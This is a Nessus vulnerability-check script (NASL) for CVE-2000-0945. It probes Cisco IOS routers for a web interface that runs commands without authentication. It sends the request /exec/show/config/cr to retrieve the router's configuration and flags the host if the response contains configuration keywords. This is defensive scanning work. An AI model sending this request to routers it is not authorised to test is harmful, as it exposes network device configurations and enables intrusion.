
#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

#
# UNTESTED!
#


if(description)
{
 script_id(10545);
 script_bugtraq_id(1846);
 script_version ("$Revision: 1.19 $");
 script_cve_id("CVE-2000-0945");

 name["english"] = "Cisco Catalyst Web Execution";
 name["francais"] = "Execution de commandes sur un Cisco catalyst";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "
It is possible to execute arbitrary commands on the
remote Cisco router, by requesting them via HTTP,
as in
	/exec/show/config/cr
	

An attacker may use this flaw to cut your network access to
the Internet, and may even lock you out of the router.

Solution : Disable the web configuration interface completely
Risk factor : High";



 desc["francais"] = "
Il est possible de faire executer des commandes arbitraires
au routeur Cisco, en faisant des requetes http telles que :

	/exec/show/config/cr
	
Un pirate peut utiliser ce problème pour couper votre réseau
d'internet.

Solution : désactivez le module de configuration par le web
Facteu de risque : Elevé"; 


 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "Obtains the remote router configuration";
 summary["francais"] = "Obtient la config du routeur";
 
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_GATHER_INFO);
 
 
 script_copyright(english:"This script is Copyright (C) 2000 Renaud Deraison",
		francais:"Ce script est Copyright (C) 2000 Renaud Deraison");
 family["english"] = "CISCO";
 family["francais"] = "CISCO";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes", "httpver.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

include("http_func.inc");


port = get_http_port(default:80);
if(get_port_state(port))
{
 banner = get_http_banner(port:port);
 if ( "cisco-IOS" >!< banner ) exit(0);

 soc = http_open_socket(port);
 if(soc)
 {
  req = http_get(item:"/exec/show/config/cr", 
  		 port:port);
  send(socket:soc, data:req);
  r = http_recv(socket:soc);
  http_close_socket(soc);
  
  req = string(
"It is possible to execute arbitrary commands on the\n",
"remote Cisco router, by requesting them via http,\n",
"as in\n",
"	/exec/show/config/cr\n\n",
	
"We could get the following configuration file :\n",
r,"\n\n",
"An attacker may use this flaw to cut your network access to\n",
"the internet, and may even lock you out of the router.\n\n",

"Solution : Disable the web configuration interface completely\n",
"Risk factor : High");

  if(("enable" >< r) &&
     ("interface" >< r) &&
     ("ip address" >< r))security_hole(port:port, data:req); 
  }
}
